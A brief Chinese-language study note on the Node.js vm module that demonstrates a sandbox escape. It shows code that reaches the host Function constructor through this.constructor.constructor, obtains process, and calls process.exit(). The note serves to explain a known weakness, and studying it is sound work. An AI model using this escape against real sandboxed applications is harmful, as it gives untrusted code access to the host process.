# Node.js API

## vm 模块

### 沙箱逃逸

```js
const vm = require('vm');
const sandbox = {};

// this.constructor 指向 Object 构造函数
// this.constructor.constructor 指向 Function 构造函数
// this.constructor.constructor("return process")().exit() 创建一个函数并执行获取到 process，之后调用 process.exit() 退出进程
const script = new vm.Script('this.constructor.constructor("return process")().exit()');

const context = vm.createContext(sandbox);
const result = script.runInContext(context);
```
